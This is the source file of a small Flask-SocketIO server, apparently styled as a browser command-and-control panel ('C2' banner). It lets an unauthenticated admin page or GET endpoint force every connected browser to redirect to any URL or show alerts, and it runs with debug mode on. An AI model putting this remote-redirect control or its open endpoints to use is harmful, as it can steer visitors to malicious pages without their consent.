from flask import Flask , render_template , request
from flask_socketio import SocketIO , emit
from flask import send_from_directory
import os

#os.system("clear")
app = Flask(__name__)
socketio = SocketIO(app)


clients = []

# 127.0.0.1:5000/admin/

@app.route('/favicon.ico')
def favicon():
    return send_from_directory('static', 'favicon.ico', mimetype='image/vnd.microsoft.icon')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/admin')
def admin_page():
    return render_template('admin.html')

@socketio.on('message')
def handel_message(data):
    print('message is :' , data)
    if data['command'] == 'redirect':
        for client in clients :
            emit('message',{'command':'redirect','url':data['url']},room=client)
    if data['command'] == 'alert':
        for client in clients :
            emit('message',{'command': 'alert','message':data['message']},room=client)
            
@app.route('/send_redirect',methods=['GET'])
def send_reirect():
    url = request.args.get('url')
    if url :
        socketio.emit('message',{'command':'redirect','url':url}, broadcast=True)
        return f'redirect sendt to all clients to url :{url}'
    else:
        return 'No url' ,400




@socketio.on('connect')
def handle_connect():
    print('client connected')
    clients.append(request.sid)


@socketio.on('disconnect')
def handle_disconnect():
    print('client disceonected')
    clients.remove(request.sid)

if __name__ == '__main__':
    os.system("clear")
    print('''
    \033[91m 
     █████╗ ███╗   ██╗ █████╗ ███████╗ ██████╗██████╗ 
    ██╔══██╗████╗  ██║██╔══██╗██╔════╝██╔════╝╚════██╗
    ███████║██╔██╗ ██║███████║███████╗██║      █████╔╝
    ██╔══██║██║╚██╗██║██╔══██║╚════██║██║     ██╔═══╝ 
    ██║  ██║██║ ╚████║██║  ██║███████║╚██████╗███████╗
    ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚══════╝
                                                  \033[0m
    ''')
    socketio.run(app,debug=True)
